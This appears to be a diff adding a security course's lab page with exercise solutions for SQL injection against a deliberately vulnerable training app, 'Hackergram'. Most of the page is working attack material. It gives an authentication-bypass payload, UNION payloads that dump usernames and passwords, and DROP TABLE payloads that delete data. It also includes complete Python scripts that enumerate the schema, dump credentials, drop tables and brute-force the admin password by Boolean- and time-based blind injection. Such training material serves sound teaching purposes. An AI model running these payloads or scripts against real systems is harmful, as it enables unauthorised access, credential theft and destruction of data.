+    <span class="n">h4</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;h4&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error message:&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">h4</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;MySQL&quot;</span> <span class="ow">in</span> <span class="n">h4</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Database is powered by MySQL&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Failed to identify Database version&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(Table : Column)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;search&#39;</span> <span class="p">:</span> <span class="s2">&quot;&#39; UNION SELECT &#39;1&#39;, TABLE_NAME, &#39;1&#39;, &#39;1&#39;, COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- &quot;</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="n">cards</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;card&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">card</span> <span class="ow">in</span> <span class="n">cards</span><span class="p">:</span>
+        <span class="n">href</span> <span class="o">=</span> <span class="n">card</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;profile&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">href</span> <span class="ow">and</span> <span class="s1">&#39;href&#39;</span> <span class="ow">in</span> <span class="n">href</span><span class="o">.</span><span class="n">attrs</span><span class="p">:</span>
+            <span class="n">table</span> <span class="o">=</span> <span class="n">href</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;username=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="n">db_name</span> <span class="o">=</span> <span class="n">card</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;card-text h6&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">db_name</span> <span class="o">==</span> <span class="s2">&quot;(hackergramdb)&quot;</span><span class="p">:</span>
+                <span class="n">column</span> <span class="o">=</span> <span class="n">card</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;card-text h5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="s2"> : </span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">reset</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div>
+</details>
+
+<h2 id="authentication-bypass">Authentication bypass</h2>
+<p>Hackergram is vulnerable to authentication bypass attacks. In this exercise, login as admin without using its password.</p>
+<details>
+<summary><strong>💡 Solution</strong></summary>
+
+In the /login endpoint, inject 
+
+<div class="highlight"><pre><span></span><code>admin&#39; and 1=1 -- 
+</code></pre></div>
+
+**Why it works:**
+
+The SQL query becomes: `SELECT * FROM Users WHERE username='admin' and 1=1 -- ' AND password='anything'`
+
+The `--` comments out the password check, and `1=1` is always true.
+
+</details>
+
+<h2 id="union-based-sqli">Union-based SQLi</h2>
+<p>Use union-based injection to dump all users and passwords from the database.</p>
+<details>
+<summary><strong>💡 Solution</strong></summary>
+
+**Method 1: Manual injection via search field**
+
+1. **In `/posts` search field, enter:**
+   <div class="highlight"><pre><span></span><code>&#39; UNION SELECT &#39;1&#39;, username, password, &#39;1&#39;, &#39;1&#39;, &#39;1&#39; FROM Users -- 
+</code></pre></div>
+
+2. **Alternative payload for better formatting:**
+   <div class="highlight"><pre><span></span><code>&#39; UNION SELECT &#39;1&#39;, CONCAT(username, &#39;:&#39;, password), &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39; FROM Users -- 
+</code></pre></div>
+
+**Method 2: Python script for automated dumping**
+
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">dump_users</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&#39; UNION SELECT &#39;1&#39;, CONCAT(username, &#39;|&#39;, password, &#39;|&#39;, name), &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39; FROM Users -- &quot;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+
+    <span class="c1"># Extract user data from response</span>
+    <span class="n">users</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([^|]+)\|([^|]+)\|([^|]+)&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Dumped Users:&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Name: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="c1"># Register and login first</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">dump_users</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div>
+
+**Expected Output:**
+- admin:admin123:Administrator
+- mr_robot:password123:Mr Robot
+- dpr:secretpass:DPR
+- etc.
+
+</details>
+
+<h2 id="piggybacked-sqli">Piggybacked SQLi</h2>
+<p>Use piggybacked SQLi to delete one table from Hackergram's database.</p>
+<details>
+<summary><strong>💡 Solution</strong></summary>
+
+**⚠️ Warning: This will permanently delete data!**
+
+**Method 1: Drop table via search injection**
+
+1. **In `/posts` search field:**
+   <div class="highlight"><pre><span></span><code>test&#39;; DROP TABLE Friends; -- 
+</code></pre></div>
+
+2. **Alternative targets:**
+   <div class="highlight"><pre><span></span><code>test&#39;; DROP TABLE Requests; -- 
+test&#39;; DROP TABLE Posts; -- 
+</code></pre></div>
+   (Don't drop Users table as it will break authentication)
+
+**Method 2: Python script approach**
+
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">delete_table</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;test&#39;; DROP TABLE </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s2">; -- &quot;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Attempted to drop table: </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">verify_deletion</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
+    <span class="c1"># Try to query the deleted table</span>
+    <span class="n">test_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&#39; UNION SELECT &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39;, &#39;1&#39; FROM </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s2"> -- &quot;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">test_payload</span><span class="p">})</span>
+    <span class="k">if</span> <span class="s2">&quot;doesn&#39;t exist&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s2">&quot;Unknown table&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;✅ Table </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s2"> successfully deleted!&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;❌ Table </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s2"> still exists&quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">delete_table</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;Friends&quot;</span><span class="p">)</span>
+        <span class="n">verify_deletion</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;Friends&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+**What happens:**
+The SQL query becomes: `SELECT * FROM Posts WHERE content LIKE '%test'; DROP TABLE Friends; -- %'`
+This executes two statements: the original SELECT and the DROP TABLE command.
+
+</details>
+
+<h2 id="boolean-based-sqli">Boolean-based SQLi</h2>
+<p>Hackergram is vulnerable to inference attacks such as Boolean-based SQLi. The following script uses this technique to bruteforce the password of the admin user by targeting the search field of the /posts endpoint:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Gets DB version and DB schema (Search Posts)</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/reset&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">register</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s2">&quot;Mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/signup&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="s2">&quot;test&#39; OR username=&#39;</span><span class="si">{user}</span><span class="s2">&#39; AND substr(password, </span><span class="si">{pos}</span><span class="s2">, 1)=&#39;</span><span class="si">{char}</span><span class="s2">&#39; -- &quot;</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+            <span class="k">if</span> <span class="s2">&quot;0 matches&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found character: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
+                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+            <span class="k">break</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Password found for </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.100&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="s1">&#39;80&#39;</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="k">else</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">SERVER</span> <span class="o">=</span> <span class="s2">&quot;http://&quot;</span> <span class="o">+</span> <span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="n">port</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">SERVER</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------------------------------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">reset</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">register</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</code></pre></div>
+<p>Run the script at the attacker and check that the attack indeed works.</p>
+<div class="admonition note">
+<p class="admonition-title">Additional exercise</p>
+<p>Modify the script to obtain the same information using a time-based injection technique</p>
+</div>
+<details>
+<summary><strong>💡 Solution for Time-based SQLi</strong></summary>
+
+**Time-based SQLi Script:**
+
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/reset&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">register</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s2">&quot;Mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/signup&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">time_based_exploit</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">base</span> <span class="o">=</span> <span class="s2">&quot;test&#39; OR (username=&#39;</span><span class="si">{user}</span><span class="s2">&#39; AND substr(password, </span><span class="si">{pos}</span><span class="s2">, 1)=&#39;</span><span class="si">{char}</span><span class="s2">&#39; AND SLEEP(3)) -- &quot;</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+
+    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">):</span>
+        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
+            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;search&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+            <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+
+            <span class="c1"># If response took longer than 2.5 seconds, we found the character</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">2.5</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found character: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
+                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
+            <span class="k">break</span>
